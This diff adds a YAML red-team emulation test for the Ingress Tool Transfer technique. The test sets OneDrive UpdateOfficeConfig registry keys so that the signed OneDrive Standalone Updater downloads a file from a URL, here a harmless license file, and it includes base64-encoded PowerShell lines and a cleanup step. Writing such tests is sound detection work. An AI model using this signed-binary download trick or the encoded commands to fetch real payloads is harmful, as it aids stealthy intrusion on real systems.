@@ -1,0 +1,35 @@
+- id: 17c0a154-f36c-5ba9-9c0f-323dec6a48d7
+  name: Soumaia ART Tests - Download a file with OneDrive Standalone Updater
+  description: 'Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.
+
+    This technique can be used to download files without executing anomalous executables.
+
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/'
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABNAGkAYwByAG8AcwBvAGYAdABcAE8AbgBlAEQAcgBpAHYAZQBcAE8AbgBlAEQAcgBpAHYAZQBTAHQAYQBuAGQAYQBsAG8AbgBlAFUAcABkAGEAdABlAHIALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIATwBuAGUARAByAGkAdgBlAFMAdABhAG4AZABhAGwAbwBuAGUAVQBwAGQAYQB0AGUAcgAuAGUAeABlACAAbgBvAHQAIABmAG8AdQBuAGQAIABhAHQAIABDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBuAGUARAByAGkAdgBlAFwATwBuAGUARAByAGkAdgBlAFMAdABhAG4AZABhAGwAbwBuAGUAVQBwAGQAYQB0AGUAcgAuAGUAeABlAC4AIABQAGwAZQBhAHMAZQAgAGkAbgBzAHQAYQBsAGwAIABPAG4AZQBEAHIAaQB2AGUAIABvAHIAIABzAHAAZQBjAGkAZgB5ACAAYwBvAHIAcgBlAGMAdAAgAHAAYQB0AGgALgAiAAoA
+          }
+          if (-not (Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe")) {
+              Write-Host "OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe. Test cannot continue."
+              exit 1
+          }
+
+          New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force | Out-Null
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateRingSettingURLFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "ODSUUpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force
+
+          # Run OneDrive Standalone Updater
+          & "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"
+        cleanup: |-
+          Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
+          Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
